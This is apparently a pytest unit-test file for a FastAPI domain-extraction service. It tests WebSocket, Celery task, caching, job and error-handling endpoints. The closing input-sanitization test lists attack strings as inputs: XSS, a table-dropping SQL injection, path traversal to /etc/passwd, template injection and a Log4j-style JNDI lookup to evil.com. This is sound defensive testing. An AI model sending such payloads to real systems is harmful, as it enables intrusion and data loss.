"""
Unit tests for new API endpoints
"""

import pytest
import pytest_asyncio
import json
import io
from unittest.mock import AsyncMock, MagicMock, patch
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from fastapi import status, WebSocket
from sqlalchemy.ext.asyncio import AsyncSession

from app.main import app
from app.core.redis_client import get_redis
from app.core.database import get_db


class TestWebSocketEndpoint:
    """Test WebSocket endpoint functionality"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    @pytest.fixture
    def mock_websocket_manager(self):
        """Mock WebSocket manager"""
        with patch('app.api.v1.endpoints.websocket.get_websocket_manager') as mock:
            manager = AsyncMock()
            manager.connect.return_value = "client_123"
            manager.disconnect.return_value = None
            manager.get_job_connections.return_value = []
            mock.return_value = manager
            yield manager

    @pytest.fixture
    def mock_connection_manager(self):
        """Mock connection manager for rate limiting"""
        with patch('app.api.v1.endpoints.websocket.get_connection_manager') as mock:
            manager = AsyncMock()
            manager.check_rate_limit.return_value = True
            manager.is_valid_job_id.return_value = True
            mock.return_value = manager
            yield manager

    def test_websocket_endpoint_exists(self, client):
        """Test that WebSocket endpoint is accessible"""
        with patch('app.api.v1.endpoints.websocket.get_websocket_manager') as mock_manager:
            mock_manager.return_value.connect = AsyncMock(return_value="client_123")
            mock_manager.return_value.disconnect = AsyncMock()

            with client.websocket_connect("/ws/jobs/valid_job_123") as websocket:
                # Connection should succeed
                assert websocket is not None

    def test_websocket_invalid_job_id(self, client):
        """Test WebSocket with invalid job ID"""
        with patch('app.api.v1.endpoints.websocket.get_connection_manager') as mock_manager:
            mock_manager.return_value.is_valid_job_id.return_value = False

            with pytest.raises(Exception):  # Should raise 403 or similar
                with client.websocket_connect("/ws/jobs/invalid!job"):
                    pass

    def test_websocket_rate_limit_exceeded(self, client):
        """Test WebSocket with rate limit exceeded"""
        with patch('app.api.v1.endpoints.websocket.get_connection_manager') as mock_manager:
            mock_manager.return_value.check_rate_limit.return_value = False
            mock_manager.return_value.is_valid_job_id.return_value = True

            with pytest.raises(Exception):  # Should raise 429
                with client.websocket_connect("/ws/jobs/job_123"):
                    pass

    @pytest.mark.asyncio
    async def test_websocket_connection_flow(self, mock_websocket_manager, mock_connection_manager):
        """Test complete WebSocket connection flow"""
        from app.api.v1.endpoints.websocket import websocket_endpoint

        # Mock WebSocket
        mock_websocket = AsyncMock(spec=WebSocket)
        mock_websocket.scope = {"path": "/ws/jobs/job_123", "query_string": b""}
        mock_websocket.client = MagicMock()
        mock_websocket.client.host = "127.0.0.1"

        # Mock job ID extraction
        mock_websocket.scope["path_params"] = {"job_id": "job_123"}

        # Test connection acceptance
        await websocket_endpoint(mock_websocket, "job_123")

        # Verify manager calls
        mock_connection_manager.check_rate_limit.assert_called_once()
        mock_connection_manager.is_valid_job_id.assert_called_once_with("job_123")
        mock_websocket_manager.connect.assert_called_once()

    @pytest.mark.asyncio
    async def test_websocket_message_handling(self):
        """Test WebSocket message handling"""
        # This would require more complex mocking of the WebSocket message flow
        # For now, we'll test the message handling logic
        pass


class TestCeleryEndpoints:
    """Test Celery management endpoints"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    @pytest.fixture
    def mock_current_app(self):
        """Mock Celery current_app"""
        with patch('app.api.v1.endpoints.celery.current_app') as mock:
            yield mock

    @pytest.fixture
    def mock_redis(self):
        """Mock Redis client"""
        with patch('app.api.v1.endpoints.celery.get_redis') as mock:
            redis_client = AsyncMock()
            mock.return_value = redis_client
            yield redis_client

    def test_extract_domain_endpoint_success(self, client, mock_current_app):
        """Test single domain extraction endpoint"""
        # Mock successful task
        mock_task = MagicMock()
        mock_task.id = "task_123"
        mock_current_app.send_task.return_value = mock_task

        response = client.post(
            "/api/v1/celery/tasks/extract-domain",
            json={"domain": "example.com", "concurrency": 5}
        )

        assert response.status_code == 200
        data = response.json()
        assert data["task_id"] == "task_123"
        assert data["status"] == "queued"
        assert "queue" in data

        # Verify task was sent
        mock_current_app.send_task.assert_called_once()

    def test_extract_domain_endpoint_invalid_domain(self, client):
        """Test extraction endpoint with invalid domain"""
        response = client.post(
            "/api/v1/celery/tasks/extract-domain",
            json={"domain": "", "concurrency": 5}
        )

        assert response.status_code == 422  # Validation error

    def test_extract_domain_endpoint_missing_domain(self, client):
        """Test extraction endpoint without domain"""
        response = client.post(
            "/api/v1/celery/tasks/extract-domain",
            json={"concurrency": 5}
        )

        assert response.status_code == 422  # Validation error

    def test_batch_extract_endpoint_success(self, client, mock_current_app):
        """Test batch domain extraction endpoint"""
        domains = ["example1.com", "example2.com", "example3.com"]

        # Mock successful task
        mock_task = MagicMock()
        mock_task.id = "batch_task_123"
        mock_current_app.send_task.return_value = mock_task

        response = client.post(
            "/api/v1/celery/tasks/batch-extract",
            json={
                "domains": domains,
                "concurrency": 10
            }
        )

        assert response.status_code == 200
        data = response.json()
        assert data["task_id"] == "batch_task_123"
        assert data["status"] == "queued"
        assert data["total_domains"] == len(domains)

    def test_batch_extract_endpoint_empty_list(self, client):
        """Test batch extraction with empty domain list"""
        response = client.post(
            "/api/v1/celery/tasks/batch-extract",
            json={"domains": [], "concurrency": 10}
        )

        assert response.status_code == 422  # Validation error

    def test_batch_extract_endpoint_too_many_domains(self, client):
        """Test batch extraction with too many domains"""
        domains = [f"example{i}.com" for i in range(1000)]  # Exceeds limit

        response = client.post(
            "/api/v1/celery/tasks/batch-extract",
            json={"domains": domains, "concurrency": 10}
        )

        assert response.status_code == 422  # Validation error

    def test_get_task_status_success(self, client, mock_current_app):
        """Test getting task status"""
        # Mock task result
        mock_result = MagicMock()
        mock_result.state = "SUCCESS"
        mock_result.result = {"domain": "example.com", "status": "extracted"}
        mock_result.ready.return_value = True
        mock_result.successful.return_value = True
        mock_result.failed.return_value = False

        mock_current_app.AsyncResult.return_value = mock_result

        response = client.get("/api/v1/celery/tasks/task_123/status")

        assert response.status_code == 200
        data = response.json()
        assert data["task_id"] == "task_123"
        assert data["state"] == "SUCCESS"
        assert data["ready"] is True
        assert data["result"] == {"domain": "example.com", "status": "extracted"}

    def test_get_task_status_not_found(self, client, mock_current_app):
        """Test getting status of non-existent task"""
        mock_result = MagicMock()
        mock_result.state = "PENDING"
        mock_result.ready.return_value = False
        mock_current_app.AsyncResult.return_value = mock_result

        response = client.get("/api/v1/celery/tasks/nonexistent_task/status")

        assert response.status_code == 200
        data = response.json()
        assert data["state"] == "PENDING"
        assert data["ready"] is False

    def test_get_task_status_failed(self, client, mock_current_app):
        """Test getting status of failed task"""
        mock_result = MagicMock()
        mock_result.state = "FAILURE"
        mock_result.result = Exception("Extraction failed")
        mock_result.traceback = "Traceback..."
        mock_result.ready.return_value = True
        mock_result.successful.return_value = False
        mock_result.failed.return_value = True

        mock_current_app.AsyncResult.return_value = mock_result

        response = client.get("/api/v1/celery/tasks/failed_task/status")

        assert response.status_code == 200
        data = response.json()
        assert data["state"] == "FAILURE"
        assert "error" in data
        assert "traceback" in data

    def test_cancel_task_success(self, client, mock_current_app):
        """Test canceling a task"""
        mock_result = MagicMock()
        mock_result.revoke.return_value = None
        mock_current_app.control.revoke.return_value = None

        response = client.delete("/api/v1/celery/tasks/task_123/cancel")

        assert response.status_code == 200
        data = response.json()
        assert data["task_id"] == "task_123"
        assert data["cancelled"] is True

    def test_get_workers_info_success(self, client, mock_current_app):
        """Test getting workers information"""
        # Mock workers stats
        mock_stats = {
            "worker1@hostname": {
                "pool": {"max-concurrency": 4, "processes": []},
                "total": 100
            },
            "worker2@hostname": {
                "pool": {"max-concurrency": 8, "processes": []},
                "total": 200
            }
        }

        mock_inspect = MagicMock()
        mock_inspect.stats.return_value = mock_stats
        mock_inspect.active.return_value = {
            "worker1@hostname": [{"id": "task1", "name": "extract_domain"}]
        }
        mock_current_app.control.inspect.return_value = mock_inspect

        response = client.get("/api/v1/celery/workers")

        assert response.status_code == 200
        data = response.json()
        assert "workers" in data
        assert len(data["workers"]) == 2
        assert "total_tasks" in data
        assert "active_tasks" in data

    def test_get_workers_info_no_workers(self, client, mock_current_app):
        """Test getting workers info when no workers are active"""
        mock_inspect = MagicMock()
        mock_inspect.stats.return_value = None
        mock_current_app.control.inspect.return_value = mock_inspect

        response = client.get("/api/v1/celery/workers")

        assert response.status_code == 200
        data = response.json()
        assert data["workers"] == []
        assert data["total_workers"] == 0

    def test_get_queue_metrics_success(self, client, mock_current_app, mock_redis):
        """Test getting queue metrics"""
        # Mock active tasks
        mock_active = {
            "worker1": [{"id": "task1", "args": ["example.com"]}]
        }

        # Mock scheduled tasks
        mock_scheduled = {
            "worker1": [{"id": "task2", "eta": datetime.utcnow()}]
        }

        # Mock reserved tasks
        mock_reserved = {
            "worker1": [{"id": "task3", "args": ["example2.com"]}]
        }

        mock_inspect = MagicMock()
        mock_inspect.active.return_value = mock_active
        mock_inspect.scheduled.return_value = mock_scheduled
        mock_inspect.reserved.return_value = mock_reserved
        mock_current_app.control.inspect.return_value = mock_inspect

        # Mock Redis queue lengths
        mock_redis.llen.return_value = 5

        response = client.get("/api/v1/celery/queues/metrics")

        assert response.status_code == 200
        data = response.json()
        assert "queues" in data
        assert "active_tasks" in data
        assert "scheduled_tasks" in data
        assert "reserved_tasks" in data

    def test_get_system_metrics_success(self, client, mock_current_app, mock_redis):
        """Test getting system metrics"""
        # Mock Celery stats
        mock_stats = {
            "worker1": {"total": 100, "pool": {"max-concurrency": 4}}
        }

        mock_inspect = MagicMock()
        mock_inspect.stats.return_value = mock_stats
        mock_current_app.control.inspect.return_value = mock_inspect

        # Mock Redis stats
        mock_redis.info.return_value = {
            "used_memory": 1000000,
            "connected_clients": 5
        }

        # Mock cache statistics
        mock_redis.get.return_value = 50

        response = client.get("/api/v1/celery/metrics")

        assert response.status_code == 200
        data = response.json()
        assert "celery" in data
        assert "redis" in data
        assert "cache" in data
        assert "timestamp" in data

    def test_health_check_success(self, client, mock_current_app, mock_redis):
        """Test health check endpoint"""
        # Mock Celery health
        mock_inspect = MagicMock()
        mock_inspect.stats.return_value = {"worker1": {"total": 10}}
        mock_current_app.control.inspect.return_value = mock_inspect

        # Mock Redis health
        mock_redis.ping.return_value = True

        response = client.get("/api/v1/celery/health")

        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"
        assert "checks" in data
        assert data["checks"]["celery"]["status"] == "healthy"
        assert data["checks"]["redis"]["status"] == "healthy"

    def test_health_check_unhealthy(self, client, mock_current_app, mock_redis):
        """Test health check when services are unhealthy"""
        # Mock Celery failure
        mock_inspect = MagicMock()
        mock_inspect.stats.side_effect = Exception("Celery unavailable")
        mock_current_app.control.inspect.return_value = mock_inspect

        # Mock Redis failure
        mock_redis.ping.side_effect = Exception("Redis unavailable")

        response = client.get("/api/v1/celery/health")

        assert response.status_code == 503
        data = response.json()
        assert data["status"] == "unhealthy"


class TestDomainServiceEnhancements:
    """Test enhanced domain service endpoints"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    @pytest.fixture
    def mock_db_session(self):
        """Mock database session"""
        session = AsyncMock(spec=AsyncSession)
        session.execute.return_value.scalar_one_or_none.return_value = None
        session.commit.return_value = None
        session.refresh.return_value = None
        return session

    @pytest.fixture
    def mock_redis(self):
        """Mock Redis client"""
        redis_client = AsyncMock()
        redis_client.get.return_value = None
        redis_client.set.return_value = True
        return redis_client

    @patch('app.core.database.get_db')
    @patch('app.core.redis_client.get_redis')
    def test_get_domain_with_cache_hit(self, mock_get_redis, mock_get_db, client, mock_db_session, mock_redis):
        """Test getting domain with cache hit"""
        # Setup mocks
        mock_get_db.return_value = mock_db_session
        mock_get_redis.return_value = mock_redis

        # Mock cached domain
        cached_domain = {
            "domain": "example.com",
            "meta_title": "Example Site",
            "meta_description": "Test description"
        }
        mock_redis.get.return_value = cached_domain

        response = client.get("/api/v1/domains/example.com")

        assert response.status_code == 200
        data = response.json()
        assert data["domain"] == "example.com"
        assert data["meta_title"] == "Example Site"

        # Verify cache was checked
        mock_redis.get.assert_called_once()

    @patch('app.core.database.get_db')
    @patch('app.core.redis_client.get_redis')
    def test_get_domain_cache_miss(self, mock_get_redis, mock_get_db, client, mock_db_session, mock_redis):
        """Test getting domain with cache miss"""
        # Setup mocks
        mock_get_db.return_value = mock_db_session
        mock_get_redis.return_value = mock_redis

        # Mock cache miss
        mock_redis.get.return_value = None

        # Mock database domain
        from app.models.domain import Domain
        mock_domain = MagicMock(spec=Domain)
        mock_domain.to_dict.return_value = {
            "domain": "example.com",
            "meta_title": "Example Site",
            "meta_description": "Test description"
        }
        mock_db_session.execute.return_value.scalar_one_or_none.return_value = mock_domain

        response = client.get("/api/v1/domains/example.com")

        assert response.status_code == 200
        data = response.json()
        assert data["domain"] == "example.com"

    @patch('app.core.database.get_db')
    @patch('app.core.redis_client.get_redis')
    def test_get_domain_not_found(self, mock_get_redis, mock_get_db, client, mock_db_session, mock_redis):
        """Test getting non-existent domain"""
        # Setup mocks
        mock_get_db.return_value = mock_db_session
        mock_get_redis.return_value = mock_redis

        # Mock cache miss and database miss
        mock_redis.get.return_value = None
        mock_db_session.execute.return_value.scalar_one_or_none.return_value = None

        response = client.get("/api/v1/domains/nonexistent.com")

        assert response.status_code == 404
        data = response.json()
        assert data["detail"] == "Domain not found"

    @patch('app.core.database.get_db')
    @patch('app.core.redis_client.get_redis')
    def test_search_domains_with_cache(self, mock_get_redis, mock_get_db, client, mock_db_session, mock_redis):
        """Test domain search with caching"""
        # Setup mocks
        mock_get_db.return_value = mock_db_session
        mock_get_redis.return_value = mock_redis

        # Mock cached search results
        cached_results = [
            {"domain": "example.com", "meta_title": "Example Site"},
            {"domain": "test.com", "meta_title": "Test Site"}
        ]
        mock_redis.get.return_value = cached_results

        response = client.get("/api/v1/domains/search?q=example")

        assert response.status_code == 200
        data = response.json()
        assert len(data["domains"]) == 2
        assert data["cached"] is True

    @patch('app.core.database.get_db')
    @patch('app.core.redis_client.get_redis')
    def test_batch_extract_with_priority(self, mock_get_redis, mock_get_db, client, mock_db_session, mock_redis):
        """Test batch extraction with priority queue"""
        # Setup mocks
        mock_get_db.return_value = mock_db_session
        mock_get_redis.return_value = mock_redis

        domains = ["example1.com", "example2.com"]
        priority = "high"

        response = client.post(
            "/api/v1/domains/batch-extract",
            json={
                "domains": domains,
                "priority": priority,
                "concurrency": 5
            }
        )

        # This would test priority queue functionality
        # Implementation depends on the actual endpoint logic
        assert response.status_code in [200, 422]  # Depending on implementation

    def test_rate_limiting_endpoint(self, client):
        """Test rate limiting functionality"""
        # Make multiple rapid requests
        responses = []
        for i in range(10):
            response = client.get("/api/v1/domains/example.com")
            responses.append(response)
            if response.status_code == 429:
                break

        # If rate limiting is implemented, should eventually return 429
        # This test depends on the actual rate limiting implementation
        assert any(r.status_code in [200, 404, 429] for r in responses)


class TestJobEnhancements:
    """Test enhanced job endpoints"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    @pytest.fixture
    def mock_job(self):
        """Mock job instance"""
        job = MagicMock()
        job.id = "job_123"
        job.status = "processing"
        job.progress_percentage = 50.0
        job.status_message = "Processing 50 of 100"
        job.started_at = datetime.utcnow()
        job.created_at = datetime.utcnow()
        return job

    def test_get_job_with_real_time_updates(self, client, mock_job):
        """Test getting job with real-time update capability"""
        with patch('app.services.extraction_service.ExtractionService.get_job') as mock_get_job:
            mock_get_job.return_value = mock_job

            response = client.get("/api/v1/jobs/job_123")

            assert response.status_code == 200
            data = response.json()
            assert data["id"] == "job_123"
            assert data["status"] == "processing"
            assert data["progress_percentage"] == 50.0

    def test_subscribe_to_job_updates(self, client):
        """Test subscribing to job updates"""
        # This would test WebSocket subscription to job updates
        with patch('app.api.v1.endpoints.websocket.get_websocket_manager') as mock_manager:
            mock_manager.return_value.connect = AsyncMock(return_value="client_123")
            mock_manager.return_value.get_job_connections.return_value = ["client_123"]

            with client.websocket_connect("/ws/jobs/job_123") as websocket:
                # Should be able to subscribe to job updates
                assert websocket is not None

    @patch('app.core.database.get_db')
    def test_cancel_job_with_task_cancellation(self, mock_get_db, client):
        """Test canceling job and its associated tasks"""
        with patch('app.services.extraction_service.ExtractionService') as mock_service:
            mock_service_instance = AsyncMock()
            mock_service.return_value = mock_service_instance
            mock_service_instance.cancel_job.return_value = True

            response = client.delete("/api/v1/jobs/job_123/cancel")

            assert response.status_code == 200
            data = response.json()
            assert data["cancelled"] is True
            mock_service_instance.cancel_job.assert_called_once_with("job_123")


class TestErrorHandling:
    """Test API endpoint error handling"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    def test_validation_error_handling(self, client):
        """Test validation error handling"""
        # Test with invalid data
        response = client.post(
            "/api/v1/celery/tasks/extract-domain",
            json={"domain": "", "concurrency": -1}
        )

        assert response.status_code == 422
        data = response.json()
        assert "detail" in data

    def test_not_found_error_handling(self, client):
        """Test 404 error handling"""
        response = client.get("/api/v1/nonexistent/endpoint")

        assert response.status_code == 404

    def test_internal_error_handling(self, client):
        """Test internal server error handling"""
        with patch('app.core.database.get_db') as mock_get_db:
            # Make database raise an exception
            mock_get_db.side_effect = Exception("Database connection failed")

            response = client.get("/api/v1/jobs/job_123")

            # Should handle gracefully
            assert response.status_code in [500, 404]

    def test_timeout_handling(self, client):
        """Test request timeout handling"""
        with patch('app.core.database.get_db') as mock_get_db:
            # Mock slow database response
            import asyncio
            mock_get_db.side_effect = asyncio.TimeoutError()

            response = client.get("/api/v1/jobs/job_123", timeout=1.0)

            # Should handle timeout gracefully
            assert response.status_code in [500, 404, 504]


class TestSecurityAndAuthentication:
    """Test API security and authentication"""

    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)

    def test_rate_limiting_headers(self, client):
        """Test rate limiting headers are present"""
        response = client.get("/api/v1/domains/example.com")

        # Check for rate limiting headers (if implemented)
        headers = response.headers
        # assert "X-RateLimit-Limit" in headers
        # assert "X-RateLimit-Remaining" in headers

    def test_cors_headers(self, client):
        """Test CORS headers are present"""
        response = client.options("/api/v1/domains/example.com")

        # Check for CORS headers
        headers = response.headers
        # assert "Access-Control-Allow-Origin" in headers
        # assert "Access-Control-Allow-Methods" in headers

    def test_security_headers(self, client):
        """Test security headers are present"""
        response = client.get("/api/v1/domains/example.com")

        # Check for security headers
        headers = response.headers
        # assert "X-Content-Type-Options" in headers
        # assert "X-Frame-Options" in headers

    def test_input_sanitization(self, client):
        """Test input sanitization"""
        # Test with malicious input
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE domains; --",
            "../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}"  # Log4j style
        ]

        for malicious_input in malicious_inputs:
            response = client.post(
                "/api/v1/celery/tasks/extract-domain",
                json={"domain": malicious_input, "concurrency": 5}
            )

            # Should handle malicious input gracefully
            # Either reject (422) or sanitize and accept
            assert response.status_code in [200, 422]

            if response.status_code == 200:
                # Verify input was sanitized if accepted
                data = response.json()
                # Check that malicious content is not in response